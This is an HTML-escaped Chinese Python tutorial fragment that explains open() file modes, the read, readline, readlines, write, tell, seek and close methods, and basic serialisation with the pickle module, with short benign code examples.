&lt;h3 id=&#34;读和写文件&#34;&gt;&lt;a href=&#34;#读和写文件&#34; class=&#34;headerlink&#34; title=&#34;读和写文件&#34;&gt;&lt;/a&gt;读和写文件&lt;/h3&gt;&lt;p&gt;open() 返回一个 file 对象&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;filename：包含了你要访问的文件名称的字符串值&lt;/li&gt;
&lt;li&gt;mode：决定了打开文件的模式：只读，写入，追加等，默认文件访问模式为只读(r)&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;模式&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;r&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;rb&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;r+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。文件指针将会放在文件的开头。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;rb+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;w&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;wb&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;w+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;wb+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;a&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ab&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;a+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;ab+&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;文件对象的方法&#34;&gt;&lt;a href=&#34;#文件对象的方法&#34; class=&#34;headerlink&#34; title=&#34;文件对象的方法&#34;&gt;&lt;/a&gt;文件对象的方法&lt;/h4&gt;&lt;h5 id=&#34;f-read&#34;&gt;&lt;a href=&#34;#f-read&#34; class=&#34;headerlink&#34; title=&#34;f.read()&#34;&gt;&lt;/a&gt;f.read()&lt;/h5&gt;&lt;p&gt;f.read(size)将读取一定数目的数据, 然后作为字符串或字节对象返回，size 是一个可选的数字类型的参数，当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 打开一个文件&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/foo.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 关闭打开的文件&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;f-readline&#34;&gt;&lt;a href=&#34;#f-readline&#34; class=&#34;headerlink&#34; title=&#34;f.readline()&#34;&gt;&lt;/a&gt;f.readline()&lt;/h5&gt;&lt;p&gt;f.readline() 会从文件中读取单独的一行，换行符为 ‘\n’，f.readline() 如果返回一个空字符串, 说明已经已经读取到最后一行&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 打开一个文件&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/foo.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 关闭打开的文件&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;f-readlines&#34;&gt;&lt;a href=&#34;#f-readlines&#34; class=&#34;headerlink&#34; title=&#34;f.readlines()&#34;&gt;&lt;/a&gt;f.readlines()&lt;/h5&gt;&lt;p&gt;f.readlines() 将返回该文件中包含的所有行，如果设置可选参数 sizehint, 则读取指定长度的字节, 并且将这些字节按行分割&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 打开一个文件&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/foo.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 关闭打开的文件&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 打开一个文件&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/foo.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 关闭打开的文件&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;f-write&#34;&gt;&lt;a href=&#34;#f-write&#34; class=&#34;headerlink&#34; title=&#34;f.write()&#34;&gt;&lt;/a&gt;f.write()&lt;/h5&gt;&lt;p&gt;f.write(string) 将 string 写入到文件中, 然后返回写入的字符数&lt;/p&gt;
&lt;p&gt;不是字符串的需要先转换&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 打开一个文件&lt;/span&gt;
f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/foo.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;w&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Python 是一个非常好的语言。\n是的，的确非常好!!\n&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 关闭打开的文件&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 29&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;f-tell&#34;&gt;&lt;a href=&#34;#f-tell&#34; class=&#34;headerlink&#34; title=&#34;f.tell()&#34;&gt;&lt;/a&gt;f.tell()&lt;/h5&gt;&lt;p&gt;f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数&lt;/p&gt;
&lt;h5 id=&#34;f-seek&#34;&gt;&lt;a href=&#34;#f-seek&#34; class=&#34;headerlink&#34; title=&#34;f.seek()&#34;&gt;&lt;/a&gt;f.seek()&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;f.seek(offset, from_what) 函数改变文件当前的位置&lt;/li&gt;
&lt;li&gt;from_what 的值， 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾&lt;/li&gt;
&lt;li&gt;from_what 值为默认为0，即文件开头&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符&lt;/li&gt;
&lt;li&gt;seek(x,1) ： 表示从当前位置往后移动x个字符&lt;/li&gt;
&lt;li&gt;seek(-x,2)：表示从文件的结尾往前移动x个字符&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;f &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/tmp/foo.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rb+&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;0123456789abcdef&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 16&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;seek&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 移动到文件的第六个字节&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# b&#39;5&#39;&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;seek&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 移动到文件的倒数第三字节&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 13&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# b&#39;d&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;f-close&#34;&gt;&lt;a href=&#34;#f-close&#34; class=&#34;headerlink&#34; title=&#34;f.close()&#34;&gt;&lt;/a&gt;f.close()&lt;/h5&gt;&lt;p&gt;当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源&lt;/p&gt;
&lt;h4 id=&#34;pickle模块&#34;&gt;&lt;a href=&#34;#pickle模块&#34; class=&#34;headerlink&#34; title=&#34;pickle模块&#34;&gt;&lt;/a&gt;pickle模块&lt;/h4&gt;&lt;p&gt;python的pickle模块实现了基本的数据序列和反序列化&lt;/p&gt;
&lt;p&gt;基本接口：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;obj&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;protocol&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;有了 pickle 这个对象, 就能对 file 以读取的形式打开:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;load&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;示例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle

&lt;span class=&#34;token comment&#34;&gt;# 使用pickle模块将数据对象保存到文件&lt;/span&gt;
data1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;string&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;u&#39;Unicode string&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;token string&#34;&gt;&#39;c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

selfref_list &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
selfref_list&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;selfref_list&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

output &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data.pkl&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# Pickle dictionary using protocol 0.&lt;/span&gt;
pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# Pickle the list using the highest protocol available.&lt;/span&gt;
pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;selfref_list&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

output&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

